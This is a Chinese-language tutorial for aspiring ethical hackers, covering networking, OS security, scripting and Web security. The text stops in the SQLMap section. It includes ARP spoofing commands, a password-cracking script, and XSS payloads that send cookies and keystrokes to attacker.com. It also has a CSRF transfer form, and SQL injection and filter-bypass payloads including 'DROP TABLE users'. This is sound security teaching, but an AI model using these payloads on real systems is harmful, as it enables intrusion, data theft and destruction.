

> 白帽黑客（White Hat Hacker）是指利用黑客技术进行合法安全测试的专业人员
> 本笔记涵盖从零基础到顶级白帽黑客的完整学习路径
> 更新日期：2025年12月

---

## 目录

1. [白帽黑客概述](#1-白帽黑客概述)
2. [基础知识体系](#2-基础知识体系)
3. [网络基础与协议分析](#3-网络基础与协议分析)
4. [操作系统安全](#4-操作系统安全)
5. [编程与脚本开发](#5-编程与脚本开发)
6. [Web安全基础](#6-web安全基础)
7. [Web安全进阶](#7-web安全进阶)
8. [渗透测试方法论](#8-渗透测试方法论)
9. [漏洞挖掘与利用](#9-漏洞挖掘与利用)
10. [逆向工程基础](#10-逆向工程基础)
11. [移动安全](#11-移动安全)
12. [云安全与容器安全](#12-云安全与容器安全)
13. [红队技术](#13-红队技术)
14. [漏洞赏金猎人](#14-漏洞赏金猎人)
15. [职业发展与认证](#15-职业发展与认证)
16. [常见错误与解决方案](#16-常见错误与解决方案)
17. [学习资源与社区](#17-学习资源与社区)

---

## 1. 白帽黑客概述

### 1.1 什么是白帽黑客？

白帽黑客（White Hat Hacker），也称为道德黑客（Ethical Hacker），是指那些利用黑客技术来发现和修复安全漏洞的专业人员。与恶意黑客（黑帽黑客）不同，白帽黑客的目标是帮助组织提高安全性，而不是造成破坏。

```
┌─────────────────────────────────────────────────────────────────┐
│                      黑客类型对比                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   白帽黑客 (White Hat)                                          │
│   ├── 合法授权测试                                              │
│   ├── 帮助修复漏洞                                              │
│   ├── 遵守法律法规                                              │
│   └── 职业：渗透测试工程师、安全研究员                          │
│                                                                 │
│   灰帽黑客 (Grey Hat)                                           │
│   ├── 未经授权但无恶意                                          │
│   ├── 发现漏洞后通知厂商                                        │
│   └── 法律边缘地带                                              │
│                                                                 │
│   黑帽黑客 (Black Hat)                                          │
│   ├── 恶意攻击                                                  │
│   ├── 窃取数据、破坏系统                                        │
│   └── 违法犯罪行为                                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 白帽黑客的职业方向

| 职业方向 | 主要职责 | 技能要求 | 薪资范围（年薪） |
|----------|----------|----------|------------------|
| 渗透测试工程师 | 模拟攻击测试系统安全 | 渗透测试、漏洞利用 | 15-50万 |
| 安全研究员 | 研究新漏洞和攻击技术 | 逆向工程、漏洞挖掘 | 30-100万+ |
| 红队成员 | 模拟APT攻击 | 高级渗透、社会工程 | 30-80万 |
| 漏洞赏金猎人 | 独立挖掘漏洞获取奖金 | 全栈安全技能 | 不固定，顶级可达百万 |
| 安全顾问 | 为企业提供安全建议 | 综合安全知识 | 25-60万 |
| 应急响应专家 | 处理安全事件 | 取证分析、事件响应 | 20-50万 |

### 1.3 成为顶级白帽黑客的路线图

```
┌─────────────────────────────────────────────────────────────────┐
│                 白帽黑客成长路线图                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   第一阶段：基础建设（3-6个月）                                 │
│   ├── 计算机基础                                                │
│   ├── 网络协议                                                  │
│   ├── Linux/Windows 操作系统                                    │
│   └── 编程语言（Python/Bash）                                   │
│                                                                 │
│   第二阶段：安全入门（6-12个月）                                │
│   ├── Web 安全基础                                              │
│   ├── 常见漏洞原理                                              │
│   ├── 安全工具使用                                              │
│   └── CTF 入门                                                  │
│                                                                 │
│   第三阶段：技能深化（1-2年）                                   │
│   ├── 渗透测试方法论                                            │
│   ├── 漏洞挖掘技术                                              │
│   ├── 逆向工程基础                                              │
│   └── 获取安全认证                                              │
│                                                                 │
│   第四阶段：专业精进（2-5年）                                   │
│   ├── 专攻某一领域                                              │
│   ├── 参与漏洞赏金项目                                          │
│   ├── 发表安全研究                                              │
│   └── 建立行业声誉                                              │
│                                                                 │
│   第五阶段：顶级专家（5年+）                                    │
│   ├── 发现高危漏洞                                              │
│   ├── 开发安全工具                                              │
│   ├── 培养新人                                                  │
│   └── 引领行业发展                                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. 基础知识体系

### 2.1 计算机基础

在开始学习黑客技术之前，你需要对计算机有基本的了解。这包括硬件架构、操作系统原理、数据结构等。

#### 2.1.1 计算机架构基础

```
┌─────────────────────────────────────────────────────────────────┐
│                    计算机基本架构                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │                      应用层                              │   │
│   │              (浏览器、办公软件、游戏等)                  │   │
│   └─────────────────────────────────────────────────────────┘   │
│                            ↓                                    │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │                     操作系统                             │   │
│   │           (Windows、Linux、macOS)                        │   │
│   │    ┌──────────┐  ┌──────────┐  ┌──────────┐            │   │
│   │    │ 进程管理 │  │ 内存管理 │  │ 文件系统 │            │   │
│   │    └──────────┘  └──────────┘  └──────────┘            │   │
│   └─────────────────────────────────────────────────────────┘   │
│                            ↓                                    │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │                      硬件层                              │   │
│   │    ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐              │   │
│   │    │ CPU  │  │ 内存 │  │ 硬盘 │  │ 网卡 │              │   │
│   │    └──────┘  └──────┘  └──────┘  └──────┘              │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 2.1.2 数据表示与编码

理解数据在计算机中的表示方式对于安全研究至关重要，特别是在分析漏洞和编写利用代码时。

```python
# 进制转换示例
decimal = 255
binary = bin(decimal)      # '0b11111111'
octal = oct(decimal)       # '0o377'
hexadecimal = hex(decimal) # '0xff'

print(f"十进制: {decimal}")
print(f"二进制: {binary}")
print(f"八进制: {octal}")
print(f"十六进制: {hexadecimal}")

# 字符编码
text = "Hello, 世界"
utf8_bytes = text.encode('utf-8')
print(f"UTF-8 编码: {utf8_bytes}")
print(f"十六进制: {utf8_bytes.hex()}")

# Base64 编码（常用于数据传输）
import base64
encoded = base64.b64encode(text.encode())
print(f"Base64: {encoded.decode()}")
decoded = base64.b64decode(encoded)
print(f"解码: {decoded.decode()}")
```

#### 2.1.3 内存与进程

```bash
# Linux 查看进程
ps aux                    # 查看所有进程
ps aux | grep nginx       # 查找特定进程
top                       # 实时进程监控
htop                      # 更友好的进程监控

# 查看内存使用
free -h                   # 内存使用情况
cat /proc/meminfo         # 详细内存信息

# 查看进程内存映射
cat /proc/<pid>/maps      # 进程内存映射
cat /proc/<pid>/status    # 进程状态信息
```

### 2.2 必备技能清单

作为白帽黑客，以下技能是必须掌握的：

| 技能类别 | 具体技能 | 重要程度 | 学习建议 |
|----------|----------|----------|----------|
| 操作系统 | Linux 命令行 | ★★★★★ | 日常使用 Kali/Ubuntu |
| 操作系统 | Windows 管理 | ★★★★☆ | 了解 AD、组策略 |
| 网络 | TCP/IP 协议 | ★★★★★ | 抓包分析实践 |
| 网络 | HTTP/HTTPS | ★★★★★ | Web 安全基础 |
| 编程 | Python | ★★★★★ | 自动化、工具开发 |
| 编程 | Bash/Shell | ★★★★☆ | 系统管理、自动化 |
| 编程 | JavaScript | ★★★★☆ | Web 安全必备 |
| 编程 | SQL | ★★★★☆ | 数据库安全 |
| 编程 | C/C++ | ★★★☆☆ | 漏洞利用、逆向 |
| 安全工具 | Burp Suite | ★★★★★ | Web 渗透必备 |
| 安全工具 | Nmap | ★★★★★ | 网络扫描 |
| 安全工具 | Metasploit | ★★★★★ | 漏洞利用框架 |
| 安全工具 | Wireshark | ★★★★☆ | 流量分析 |

---

## 3. 网络基础与协议分析

### 3.1 OSI 七层模型

理解网络协议是进行网络安全测试的基础。OSI 模型将网络通信分为七层，每一层都有可能存在安全漏洞。

```
┌─────────────────────────────────────────────────────────────────┐
│                    OSI 七层模型与安全威胁                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   第7层 应用层 (Application)                                    │
│   ├── 协议：HTTP, FTP, SMTP, DNS, SSH                          │
│   └── 威胁：SQL注入, XSS, 钓鱼攻击                             │
│                                                                 │
│   第6层 表示层 (Presentation)                                   │
│   ├── 功能：数据加密、压缩、格式转换                           │
│   └── 威胁：加密漏洞, 格式解析漏洞                             │
│                                                                 │
│   第5层 会话层 (Session)                                        │
│   ├── 功能：建立、管理、终止会话                               │
│   └── 威胁：会话劫持, 会话固定                                 │
│                                                                 │
│   第4层 传输层 (Transport)                                      │
│   ├── 协议：TCP, UDP                                           │
│   └── 威胁：SYN Flood, UDP Flood                               │
│                                                                 │
│   第3层 网络层 (Network)                                        │
│   ├── 协议：IP, ICMP, ARP                                      │
│   └── 威胁：IP欺骗, ARP欺骗, 路由攻击                          │
│                                                                 │
│   第2层 数据链路层 (Data Link)                                  │
│   ├── 协议：Ethernet, PPP                                      │
│   └── 威胁：MAC欺骗, VLAN跳跃                                  │
│                                                                 │
│   第1层 物理层 (Physical)                                       │
│   ├── 介质：网线、光纤、无线                                   │
│   └── 威胁：物理窃听, 电磁泄漏                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 TCP/IP 协议详解

#### 3.2.1 TCP 三次握手与四次挥手

```
TCP 三次握手（建立连接）：

客户端                                服务器
   │                                    │
   │  1. SYN (seq=x)                    │
   │ ─────────────────────────────────► │
   │                                    │
   │  2. SYN-ACK (seq=y, ack=x+1)       │
   │ ◄───────────────────────────────── │
   │                                    │
   │  3. ACK (ack=y+1)                  │
   │ ─────────────────────────────────► │
   │                                    │
   │        连接建立完成                 │


TCP 四次挥手（断开连接）：

客户端                                服务器
   │                                    │
   │  1. FIN                            │
   │ ─────────────────────────────────► │
   │                                    │
   │  2. ACK                            │
   │ ◄───────────────────────────────── │
   │                                    │
   │  3. FIN                            │
   │ ◄───────────────────────────────── │
   │                                    │
   │  4. ACK                            │
   │ ─────────────────────────────────► │
   │                                    │
   │        连接断开完成                 │
```

#### 3.2.2 使用 Wireshark 分析流量

```bash
# 安装 Wireshark
sudo apt install wireshark

# 命令行抓包工具 tcpdump
sudo tcpdump -i eth0                    # 抓取 eth0 接口流量
sudo tcpdump -i eth0 port 80            # 只抓取 80 端口
sudo tcpdump -i eth0 host 192.168.1.100 # 只抓取特定主机
sudo tcpdump -i eth0 -w capture.pcap    # 保存到文件
sudo tcpdump -r capture.pcap            # 读取文件

# tshark（Wireshark 命令行版）
tshark -i eth0 -f "port 80"             # 抓取 HTTP 流量
tshark -r capture.pcap -Y "http"        # 过滤 HTTP 协议
tshark -r capture.pcap -Y "http.request.method == POST"  # 过滤 POST 请求
```

### 3.3 常用网络命令

```bash
# 网络配置查看
ip addr                   # 查看 IP 地址
ip route                  # 查看路由表
ifconfig                  # 传统方式查看网络配置
netstat -tuln             # 查看监听端口
ss -tuln                  # 更现代的端口查看方式

# 网络连通性测试
ping 192.168.1.1          # ICMP 测试
traceroute google.com     # 路由追踪
mtr google.com            # 更好的路由追踪工具

# DNS 查询
nslookup example.com      # DNS 查询
dig example.com           # 更详细的 DNS 查询
dig example.com ANY       # 查询所有记录
dig @8.8.8.8 example.com  # 指定 DNS 服务器

# 网络扫描
nmap 192.168.1.0/24       # 扫描网段
nmap -sS 192.168.1.100    # SYN 扫描
nmap -sV 192.168.1.100    # 服务版本检测
nmap -O 192.168.1.100     # 操作系统检测
nmap -A 192.168.1.100     # 全面扫描
```

### 3.4 ARP 欺骗实践

ARP 欺骗是一种经典的中间人攻击技术，通过伪造 ARP 响应来截获网络流量。

```bash
# 使用 arpspoof（需要 dsniff 包）
sudo apt install dsniff

# 开启 IP 转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP 欺骗
# 告诉目标机器，网关的 MAC 是攻击者的 MAC
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# 告诉网关，目标机器的 MAC 是攻击者的 MAC
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# 使用 ettercap 进行 ARP 欺骗
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
```

> ⚠️ 警告：ARP 欺骗只能在授权的测试环境中使用，未经授权使用是违法的！

---

## 4. 操作系统安全

### 4.1 Linux 安全基础

Linux 是白帽黑客最常用的操作系统，特别是 Kali Linux。掌握 Linux 是成为白帽黑客的必备技能。

#### 4.1.1 Linux 文件系统与权限

```bash
# 文件权限说明
# -rwxr-xr-x 1 root root 4096 Jan 1 00:00 file
# │└┬┘└┬┘└┬┘
# │ │  │  └── 其他用户权限
# │ │  └───── 组权限
# │ └──────── 所有者权限
# └────────── 文件类型（- 普通文件，d 目录，l 链接）

# 权限数字表示
# r=4, w=2, x=1
# rwx = 7, rw- = 6, r-x = 5, r-- = 4

# 修改权限
chmod 755 file            # 设置权限为 rwxr-xr-x
chmod u+x file            # 给所有者添加执行权限
chmod go-w file           # 移除组和其他用户的写权限

# 修改所有者
chown user:group file     # 修改所有者和组
chown -R user:group dir   # 递归修改目录

# 特殊权限
chmod u+s file            # SUID - 以文件所有者身份执行
chmod g+s file            # SGID - 以文件所属组身份执行
chmod +t dir              # Sticky Bit - 只有所有者能删除文件
```

#### 4.1.2 Linux 用户与组管理

```bash
# 用户管理
useradd username          # 创建用户
useradd -m -s /bin/bash username  # 创建用户并设置 home 目录和 shell
userdel username          # 删除用户
userdel -r username       # 删除用户及其 home 目录
passwd username           # 设置密码

# 组管理
groupadd groupname        # 创建组
groupdel groupname        # 删除组
usermod -aG groupname username  # 将用户添加到组

# 查看用户信息
id username               # 查看用户 ID 和组
whoami                    # 当前用户
groups username           # 查看用户所属组
cat /etc/passwd           # 用户列表
cat /etc/shadow           # 密码哈希（需要 root）
cat /etc/group            # 组列表

# sudo 配置
visudo                    # 编辑 sudoers 文件
# 添加用户到 sudo 组
usermod -aG sudo username
```

#### 4.1.3 Linux 安全加固

```bash
# 1. 禁用 root SSH 登录
# 编辑 /etc/ssh/sshd_config
PermitRootLogin no

# 2. 使用 SSH 密钥认证
ssh-keygen -t rsa -b 4096
ssh-copy-id user@server

# 3. 配置防火墙
# UFW（简单防火墙）
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 80/tcp
sudo ufw status

# iptables
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -j DROP

# 4. 查找 SUID/SGID 文件（潜在提权点）
find / -perm -4000 -type f 2>/dev/null  # SUID 文件
find / -perm -2000 -type f 2>/dev/null  # SGID 文件

# 5. 检查可写目录
find / -writable -type d 2>/dev/null

# 6. 检查定时任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
```

### 4.2 Windows 安全基础

#### 4.2.1 Windows 用户与权限

```powershell
# 用户管理
net user                              # 列出用户
net user username password /add      # 创建用户
net user username /delete            # 删除用户
net localgroup administrators username /add  # 添加到管理员组

# 查看当前权限
whoami /all                          # 详细用户信息
whoami /priv                         # 当前权限

# 组管理
net localgroup                       # 列出本地组
net localgroup administrators        # 查看管理员组成员

# 服务管理
sc query                             # 列出服务
sc query servicename                 # 查询特定服务
sc start servicename                 # 启动服务
sc stop servicename                  # 停止服务
```

#### 4.2.2 Windows 安全配置

```powershell
# 查看防火墙状态
netsh advfirewall show allprofiles

# 开启/关闭防火墙
netsh advfirewall set allprofiles state on
netsh advfirewall set allprofiles state off

# 添加防火墙规则
netsh advfirewall firewall add rule name="Allow HTTP" dir=in action=allow protocol=tcp localport=80

# 查看网络连接
netstat -ano                         # 查看所有连接和 PID
netstat -ano | findstr :80           # 查找 80 端口

# 查看进程
tasklist                             # 列出进程
tasklist /v                          # 详细信息
taskkill /PID 1234 /F                # 强制终止进程

# 查看计划任务
schtasks /query                      # 列出计划任务

# 查看启动项
wmic startup list full               # 启动项
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### 4.3 Kali Linux 配置

Kali Linux 是专为渗透测试设计的 Linux 发行版，预装了大量安全工具。

```bash
# 更新系统
sudo apt update && sudo apt upgrade -y

# 安装常用工具
sudo apt install -y \
    nmap \
    wireshark \
    burpsuite \
    metasploit-framework \
    sqlmap \
    nikto \
    dirb \
    gobuster \
    hydra \
    john \
    hashcat

# 配置 Metasploit 数据库
sudo systemctl start postgresql
sudo msfdb init

# 配置 Burp Suite 证书（用于 HTTPS 拦截）
# 1. 启动 Burp Suite
# 2. 浏览器访问 http://burp
# 3. 下载 CA 证书并导入浏览器

# 配置代理
export http_proxy="http://127.0.0.1:8080"
export https_proxy="http://127.0.0.1:8080"
```

---

## 5. 编程与脚本开发

### 5.1 Python 安全编程

Python 是白帽黑客最常用的编程语言，用于编写自动化脚本、漏洞利用代码和安全工具。

#### 5.1.1 网络编程基础

```python
#!/usr/bin/env python3
"""
网络编程基础示例
"""

import socket
import requests

# TCP 客户端
def tcp_client(host, port, message):
    """简单的 TCP 客户端"""
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    client.send(message.encode())
    response = client.recv(4096)
    client.close()
    return response.decode()

# TCP 服务器
def tcp_server(host, port):
    """简单的 TCP 服务器"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")
    
    while True:
        client, addr = server.accept()
        print(f"[*] Connection from {addr}")
        data = client.recv(4096)
        print(f"[*] Received: {data.decode()}")
        client.send(b"ACK")
        client.close()

# HTTP 请求
def http_request(url):
    """发送 HTTP 请求"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    response = requests.get(url, headers=headers, timeout=10)
    return response.text

# 端口扫描器
def port_scanner(host, ports):
    """简单的端口扫描器"""
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            open_ports.append(port)
            print(f"[+] Port {port} is open")
        sock.close()
    return open_ports

if __name__ == "__main__":
    # 扫描常见端口
    target = "192.168.1.100"
    common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 8080]
    port_scanner(target, common_ports)
```

#### 5.1.2 Web 安全脚本

```python
#!/usr/bin/env python3
"""
Web 安全测试脚本示例
"""

import requests
from urllib.parse import urljoin, urlparse
import re

class WebSecurityScanner:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security Scanner)'
        })
    
    def check_sql_injection(self, url, param):
        """检测 SQL 注入"""
        payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "1' AND '1'='1",
            "1 AND 1=1",
            "1' AND '1'='2",
        ]
        
        sql_errors = [
            "mysql_fetch",
            "sql syntax",
            "mysql_num_rows",
            "ORA-",
            "PostgreSQL",
            "SQLite",
            "ODBC",
            "Microsoft SQL",
        ]
        
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            try:
                response = self.session.get(test_url, timeout=10)
                for error in sql_errors:
                    if error.lower() in response.text.lower():
                        print(f"[!] Possible SQL Injection: {test_url}")
                        return True
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return False
    
    def check_xss(self, url, param):
        """检测 XSS 漏洞"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>",
        ]
        
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            try:
                response = self.session.get(test_url, timeout=10)
                if payload in response.text:
                    print(f"[!] Possible XSS: {test_url}")
                    return True
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return False
    
    def directory_bruteforce(self, wordlist):
        """目录爆破"""
        found = []
        with open(wordlist, 'r') as f:
            for line in f:
                path = line.strip()
                url = urljoin(self.target, path)
                try:
                    response = self.session.get(url, timeout=5)
                    if response.status_code == 200:
                        print(f"[+] Found: {url}")
                        found.append(url)
                    elif response.status_code == 403:
                        print(f"[!] Forbidden: {url}")
                except:
                    pass
        return found
    
    def extract_links(self):
        """提取页面链接"""
        try:
            response = self.session.get(self.target)
            links = re.findall(r'href=[\'"]?([^\'" >]+)', response.text)
            return [urljoin(self.target, link) for link in links]
        except Exception as e:
            print(f"[-] Error: {e}")
            return []

# 使用示例
if __name__ == "__main__":
    scanner = WebSecurityScanner("http://testphp.vulnweb.com")
    
    # 检测 SQL 注入
    scanner.check_sql_injection("http://testphp.vulnweb.com/listproducts.php", "cat")
    
    # 检测 XSS
    scanner.check_xss("http://testphp.vulnweb.com/search.php", "test")
```

#### 5.1.3 密码破解脚本

```python
#!/usr/bin/env python3
"""
密码破解工具示例
"""

import hashlib
import itertools
import string
from concurrent.futures import ThreadPoolExecutor

def hash_password(password, algorithm='md5'):
    """计算密码哈希"""
    if algorithm == 'md5':
        return hashlib.md5(password.encode()).hexdigest()
    elif algorithm == 'sha1':
        return hashlib.sha1(password.encode()).hexdigest()
    elif algorithm == 'sha256':
        return hashlib.sha256(password.encode()).hexdigest()

def dictionary_attack(target_hash, wordlist_path, algorithm='md5'):
    """字典攻击"""
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            password = line.strip()
            if hash_password(password, algorithm) == target_hash:
                return password
    return None

def brute_force_attack(target_hash, charset, max_length, algorithm='md5'):
    """暴力破解"""
    for length in range(1, max_length + 1):
        for combo in itertools.product(charset, repeat=length):
            password = ''.join(combo)
            if hash_password(password, algorithm) == target_hash:
                return password
    return None

# 使用示例
if __name__ == "__main__":
    # 目标哈希（MD5 of "password123"）
    target = "482c811da5d5b4bc6d497ffa98491e38"
    
    # 字典攻击
    result = dictionary_attack(target, "/usr/share/wordlists/rockyou.txt")
    if result:
        print(f"[+] Password found: {result}")
    
    # 暴力破解（仅用于短密码）
    charset = string.ascii_lowercase + string.digits
    result = brute_force_attack(target, charset, 6)
    if result:
        print(f"[+] Password found: {result}")
```

### 5.2 Bash 脚本编程

Bash 脚本是 Linux 系统管理和自动化的基础，也是渗透测试中常用的工具。

```bash
#!/bin/bash
# 渗透测试自动化脚本示例

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# 打印带颜色的消息
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# 检查是否为 root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        print_error "Please run as root"
        exit 1
    fi
}

# 网络扫描函数
network_scan() {
    local target=$1
    print_status "Scanning $target..."
    
    # Ping 扫描
    print_status "Ping scan..."
    nmap -sn $target -oG - | grep "Up" | cut -d " " -f 2
    
    # 端口扫描
    print_status "Port scan..."
    nmap -sS -sV -p- --min-rate=1000 $target -oN scan_results.txt
}

# 目录爆破函数
dir_bruteforce() {
    local url=$1
    local wordlist=${2:-"/usr/share/wordlists/dirb/common.txt"}
    
    print_status "Directory bruteforce on $url..."
    gobuster dir -u $url -w $wordlist -o dir_results.txt
}

# 漏洞扫描函数
vuln_scan() {
    local target=$1
    
    print_status "Vulnerability scan on $target..."
    
    # Nikto 扫描
    nikto -h $target -o nikto_results.txt
    
    # Nmap 漏洞脚本
    nmap --script vuln $target -oN vuln_results.txt
}

# 主函数
main() {
    check_root
    
    if [ -z "$1" ]; then
        echo "Usage: $0 <target>"
        exit 1
    fi
    
    local target=$1
    
    print_status "Starting reconnaissance on $target"
    
    # 创建输出目录
    mkdir -p "recon_$target"
    cd "recon_$target"
    
    # 执行扫描
    network_scan $target
    
    # 如果是 Web 目标
    if [[ $target == http* ]]; then
        dir_bruteforce $target
        vuln_scan $target
    fi
    
    print_status "Reconnaissance complete!"
}

main "$@"
```

### 5.3 JavaScript 安全

JavaScript 是 Web 安全的核心，理解 JavaScript 对于发现和利用 Web 漏洞至关重要。

```javascript
// XSS Payload 示例
// 基础 XSS
<script>alert('XSS')</script>

// 绕过过滤的 XSS
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>

// 窃取 Cookie
<script>
new Image().src="http://attacker.com/steal?cookie="+document.cookie;
</script>

// 键盘记录
<script>
document.onkeypress = function(e) {
    new Image().src="http://attacker.com/log?key="+e.key;
}
</script>

// DOM XSS 检测点
// 危险的 Source
document.URL
document.documentURI
document.referrer
location.href
location.search
location.hash
window.name

// 危险的 Sink
document.write()
document.writeln()
element.innerHTML
element.outerHTML
eval()
setTimeout()
setInterval()
```

```javascript
// CSRF Token 绕过技术
// 1. 检查是否验证 Token
// 2. 检查是否可以使用空 Token
// 3. 检查是否可以使用其他用户的 Token
// 4. 检查 Token 是否与 Session 绑定

// CSRF 攻击示例
<html>
<body>
<form action="http://target.com/transfer" method="POST" id="csrf_form">
    <input type="hidden" name="to" value="attacker" />
    <input type="hidden" name="amount" value="10000" />
</form>
<script>
    document.getElementById('csrf_form').submit();
</script>
</body>
</html>
```

---

## 6. Web安全基础

### 6.1 OWASP Top 10

OWASP Top 10 是 Web 应用安全领域最权威的漏洞分类标准，每个白帽黑客都必须熟悉。

```
┌─────────────────────────────────────────────────────────────────┐
│                    OWASP Top 10 (2021)                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   A01:2021 - 访问控制失效 (Broken Access Control)               │
│   ├── 越权访问                                                  │
│   ├── IDOR (不安全的直接对象引用)                               │
│   └── 权限提升                                                  │
│                                                                 │
│   A02:2021 - 加密失败 (Cryptographic Failures)                  │
│   ├── 敏感数据明文传输                                          │
│   ├── 弱加密算法                                                │
│   └── 密钥管理不当                                              │
│                                                                 │
│   A03:2021 - 注入 (Injection)                                   │
│   ├── SQL 注入                                                  │
│   ├── 命令注入                                                  │
│   └── LDAP 注入                                                 │
│                                                                 │
│   A04:2021 - 不安全设计 (Insecure Design)                       │
│   ├── 业务逻辑漏洞                                              │
│   └── 缺乏安全设计                                              │
│                                                                 │
│   A05:2021 - 安全配置错误 (Security Misconfiguration)           │
│   ├── 默认配置                                                  │
│   ├── 不必要的功能                                              │
│   └── 错误信息泄露                                              │
│                                                                 │
│   A06:2021 - 易受攻击和过时的组件                               │
│   ├── 使用已知漏洞的组件                                        │
│   └── 未及时更新                                                │
│                                                                 │
│   A07:2021 - 身份认证失败                                       │
│   ├── 弱密码策略                                                │
│   ├── 会话管理不当                                              │
│   └── 凭证填充攻击                                              │
│                                                                 │
│   A08:2021 - 软件和数据完整性失败                               │
│   ├── 不安全的反序列化                                          │
│   └── CI/CD 管道安全                                            │
│                                                                 │
│   A09:2021 - 安全日志和监控失败                                 │
│   ├── 缺乏日志记录                                              │
│   └── 监控不足                                                  │
│                                                                 │
│   A10:2021 - 服务端请求伪造 (SSRF)                              │
│   ├── 内网探测                                                  │
│   └── 云元数据访问                                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 6.2 SQL 注入详解

SQL 注入是最经典也是最危险的 Web 漏洞之一。攻击者通过在输入中插入恶意 SQL 代码，可以绑过认证、窃取数据甚至控制服务器。

#### 6.2.1 SQL 注入类型

```sql
-- 1. 联合查询注入 (Union-based)
-- 原始查询：SELECT * FROM users WHERE id = '1'
-- 注入后：SELECT * FROM users WHERE id = '1' UNION SELECT 1,2,3,4--'

-- 判断列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  -- 直到报错

-- 联合查询
' UNION SELECT 1,2,3,4--
' UNION SELECT null,null,null,null--
' UNION SELECT username,password,3,4 FROM users--

-- 2. 报错注入 (Error-based)
-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--

-- 3. 布尔盲注 (Boolean-based Blind)
' AND 1=1--  -- 页面正常
' AND 1=2--  -- 页面异常

-- 猜解数据库名长度
' AND length(database())=5--

-- 猜解数据库名
' AND substring(database(),1,1)='a'--
' AND ascii(substring(database(),1,1))=97--

-- 4. 时间盲注 (Time-based Blind)
' AND sleep(5)--
' AND IF(1=1,sleep(5),0)--
' AND IF(substring(database(),1,1)='a',sleep(5),0)--

-- 5. 堆叠查询 (Stacked Queries)
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','password');--
```

#### 6.2.2 SQL 注入绑过技术

```sql
-- 绕过空格过滤
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- Tab
SELECT%0ausername%0aFROM%0ausers  -- 换行

-- 绕过引号过滤
SELECT * FROM users WHERE username=0x61646d696e  -- hex 编码
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)

-- 绕过关键字过滤
SeLeCt (大小写混合)
SELE/**/CT (注释分割)
SELECT (双写)

-- 绕过等号过滤
' OR 1 LIKE 1--
' OR 1 IN (1)--
' OR 1 BETWEEN 0 AND 2--

-- 绕过 AND/OR 过滤
' && 1=1--
' || 1=1--

-- 绕过逗号过滤
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
substring(str FROM 1 FOR 1)  -- 替代 substring(str,1,1)
```

#### 6.2.3 使用 SQLMap

```bash
# 基础用法
sqlmap -u "http://target.com/page.php?id=1"

# 指定参数
sqlmap -u "http://target.com/page.php?id=1&name=test" -p id

# POST 请求
sqlmap -u "http://target.com/login.php" --data="username=admin&password=123"

# 使用 Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# 指定数据库类型
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# 获取数据库信息
sqlmap -u "http://target.com/page.php?id=1" --dbs           # 列出数据库
